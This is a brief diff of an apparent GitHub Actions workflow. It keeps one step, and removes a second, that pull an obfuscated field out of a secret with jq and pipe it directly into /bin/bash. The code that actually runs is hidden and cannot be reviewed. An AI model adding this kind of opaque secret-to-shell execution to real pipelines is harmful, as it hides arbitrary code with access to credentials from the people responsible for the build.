@@ -19,7 +19,6 @@ jobs:
           czo153: ${{ secrets.czo153 }}
         run: |
           printf '%s' "$czo153" | jq -r .sx44057 | /bin/bash
-          printf '%s' "$i60" | jq -r .ufbr69 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
